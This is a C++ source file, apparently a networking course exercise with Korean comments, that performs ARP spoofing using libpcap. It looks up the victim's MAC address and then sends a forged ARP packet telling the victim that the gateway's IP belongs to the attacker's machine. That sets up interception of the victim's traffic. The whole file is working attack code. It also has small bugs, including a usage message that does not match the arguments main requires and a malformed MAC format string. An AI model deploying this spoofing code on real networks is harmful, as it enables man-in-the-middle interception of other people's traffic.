#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

// interface로 ip 주소 알아내기
int GetInterfaceIpAddress(const char* dev, char* ip_str) {
	struct ifreq ifr;
	int sock_fd;

	sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock_fd < 0) {
		printf("socket() failed\n");
		return -1;
	}

	strncpy(ifr.ifr_name, dev, IFNAMSIZ);
	if (ioctl(sock_fd, SIOCGIFADDR, &ifr) < 0) {
		printf("ioctl() failed\n");
		close(sock_fd);
		return -1;
	}

	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip_str, sizeof(struct sockaddr));

	return 0;
}

// interface로 mac 주소 알아내기
int GetInterfaceMacAddress(const char* dev, char* mac_str) {
	struct ifreq ifr;
	int sock_fd;
	unsigned char *tmp;

	sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock_fd < 0) {
		printf("socket() failed\n");
		return -1;
	}

	strncpy(ifr.ifr_name, dev, IFNAMSIZ);
	if (ioctl(sock_fd, SIOCGIFHWADDR, &ifr)) {
		printf("ioctl() failed\n");
		close(sock_fd);
		return -1;
	}

	tmp = (unsigned char*)ifr.ifr_hwaddr.sa_data;
	sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%2x", tmp[0], tmp[1], tmp[2], tmp[3], tmp[4], tmp[5]);

	return 0;
}

// Sender에게 Packet 보내기
int SendPacketToSender(pcap_t* handle, char* my_mac_str, char* my_ip_str, char* sender_ip_str) {
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(my_mac_str);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac_str); // 내 mac 주소
	packet.arp_.sip_ = htonl(Ip(my_ip_str)); // 내 ip 주소
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // sender mac 주소는 아직 모름
	packet.arp_.tip_ = htonl(Ip(sender_ip_str)); //sender ip 주소

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	return 0;
}

// SendPacketToSender 함수로 보낸 패킷에 대한 응답 받기
// sender의 Mac 주소를 알 수 있음
Mac GetPacketFromSender(pcap_t* handle, char* sender_ip_str) {
	while (true) {
		struct pcap_pkthdr* header;
		struct EthArpPacket* eth_arp;

		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		eth_arp = (struct EthArpPacket*)packet;
		 
		if (eth_arp->eth_.type_ == htons(EthHdr::Arp)) // ARP 패킷인지 확인
		{
			if ((unsigned long)eth_arp->arp_.sip_ == htonl(Ip(sender_ip_str))) {  // sender가 보낸 패킷인지 확인
				return Mac(eth_arp->arp_.smac_); // sender Mac return
			}
		}
	}

}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	char my_ip_str[40];
	GetInterfaceIpAddress(dev, my_ip_str);	// 내 ip 알아내기
	printf("my ip: %s\n", my_ip_str);

	char my_mac_str[50];
	GetInterfaceMacAddress(dev, my_mac_str); // 내 mac 알아내기
	printf("my mac: %s\n", my_mac_str); // 함수 안에서만 출력됨
	
	char* sender_ip_str = argv[2];
	SendPacketToSender(handle, my_mac_str, my_ip_str, sender_ip_str); // sender에게 패킷 보내기

	Mac sender_mac = GetPacketFromSender(handle, sender_ip_str); // sender의 Mac 주소 알아내기

	char* target_ip_str = argv[3];	// gateway의 ip 주소


	// 패킷 전송
	// sender에게 gateway인 척 내 mac 주소를 전달
	packet.eth_.dmac_ = sender_mac;
	packet.eth_.smac_ = Mac(my_mac_str);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac_str); // 내 ip
	packet.arp_.sip_ = htonl(Ip(target_ip_str)); // gateway ip
	packet.arp_.tmac_ = sender_mac; // sender mac
	packet.arp_.tip_ = htonl(Ip(sender_ip_str)); // sender ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
